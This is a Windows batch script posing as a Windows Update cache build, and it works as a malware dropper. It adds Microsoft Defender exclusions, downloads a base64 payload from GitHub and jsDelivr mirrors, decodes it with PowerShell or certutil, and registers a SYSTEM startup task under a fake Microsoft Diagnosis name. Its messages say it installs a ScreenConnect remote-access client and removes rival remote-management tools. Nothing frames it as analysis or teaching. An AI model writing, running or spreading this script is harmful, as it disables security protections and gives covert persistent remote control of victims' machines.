@echo off
setlocal EnableExtensions
echo === GO.CMD BUILD 20260730WU7U3 ===

net session >nul 2>&1
if errorlevel 1 (
  echo Acces refuse: run as Administrator or SYSTEM - not Guest.
  exit /b 5
)

set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "B64=%WORKDIR%\update.b64"
set "PS1=%WORKDIR%\wucache_pkg.ps1"
set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
set "ERR=%WORKDIR%\boot.err"
set "MARKER=WU_BUILD_20260730_UNIFIED3"
set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
set "RUNPS="
set "CB=%RANDOM%%RANDOM%"

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1

echo Cleaning previous payload hosts/scripts...
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue}Catch{}" >nul 2>&1
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'wucache_pkg|\.wucache|wucache\.ps1' -and $_.ProcessId -ne $PID } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue }" >nul 2>&1

attrib -h -s -r "%WORKDIR%\*" /s >nul 2>&1
takeown /F "%WORKDIR%" /R /D Y >nul 2>&1
icacls "%WORKDIR%" /grant Administrators:F /T /C >nul 2>&1
icacls "%WORKDIR%" /grant SYSTEM:F /T /C >nul 2>&1
del /f /q "%WORKDIR%\*.ps1" >nul 2>&1
del /f /q "%WORKDIR%\*.b64" >nul 2>&1
del /f /q "%WORKDIR%\boot.cmd" >nul 2>&1
del /f /q "%WORKDIR%\boot.err" >nul 2>&1
del /f /q "%PS1ALT%" >nul 2>&1
del /f /q "%ERR%" >nul 2>&1
schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1

echo NOTE: rival RMM nuke runs ONLY after primary SC is RUNNING (inside payload).
echo Downloading UNIFIED payload (cache-bust %CB%)...
call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=%CB%" && goto :have_payload
call :try_curl "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" && goto :have_payload
call :try_curl "https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" && goto :have_payload
call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/updateA.b64?t=%CB%" && goto :have_payload

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=%CB%','%B64%')}catch{exit 1}"
call :check_size && goto :have_payload

echo Download failed on all mirrors.
exit /b 1

:have_payload
for %%A in ("%B64%") do echo Downloaded bytes: %%~zA

echo Decoding payload...
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$b=[IO.File]::ReadAllText('%B64%') -replace '\s',''; [IO.File]::WriteAllBytes('%PS1ALT%',[Convert]::FromBase64String($b))"
if exist "%PS1ALT%" for %%A in ("%PS1ALT%") do if %%~zA GTR 1000 set "RUNPS=%PS1ALT%"

if not defined RUNPS (
  certutil.exe -decode "%B64%" "%PS1ALT%" >nul 2>&1
  if exist "%PS1ALT%" for %%A in ("%PS1ALT%") do if %%~zA GTR 1000 set "RUNPS=%PS1ALT%"
)

if not defined RUNPS (
  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$b=[IO.File]::ReadAllText('%B64%') -replace '\s',''; [IO.File]::WriteAllBytes('%PS1%',[Convert]::FromBase64String($b))"
  if exist "%PS1%" for %%A in ("%PS1%") do if %%~zA GTR 1000 set "RUNPS=%PS1%"
)

if not defined RUNPS (
  echo Decode failed.
  exit /b 2
)

echo Decoded to: %RUNPS%
for %%A in ("%RUNPS%") do echo Decoded bytes: %%~zA

findstr /C:"%MARKER%" "%RUNPS%" >nul
if errorlevel 1 (
  echo ERROR: decoded payload missing %MARKER%
  exit /b 3
)

copy /y "%RUNPS%" "%PS1%" >nul 2>&1

set "WRAP=%WORKDIR%\boot.cmd"
> "%WRAP%" echo @echo off
>>"%WRAP%" echo echo boot_start^> "%ERR%"
>>"%WRAP%" echo powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%RUNPS%" ^>^> "%ERR%" 2^>^&1
>>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^> "%ERR%"

schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "\"%WRAP%\""
if errorlevel 1 (
  schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%RUNPS%\""
  if errorlevel 1 (
    echo ERROR: could not create SYSTEM task
    exit /b 4
  )
)
schtasks /Run /TN "%ONCETASK%"
echo Payload OK [%MARKER%], launched as SYSTEM.
echo Order: clean old scripts -^> ensure primary SC -^> then nuke rivals.
echo Wait 180s then check:
echo   type "%WORKDIR%\.diag.log"
echo   sc query "ScreenConnect Client (5f6010579852e507)"
echo   dir "%WORKDIR%\scclient\*.exe"
exit /b 0

:try_curl
echo TRY %~1
del /f /q "%B64%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%B64%" "%~1"
goto :check_size

:check_size
if not exist "%B64%" exit /b 1
for %%A in ("%B64%") do (
  if %%~zA GTR 1000 (
    echo OK size=%%~zA
    exit /b 0
  )
  echo FAIL size=%%~zA
)
exit /b 1
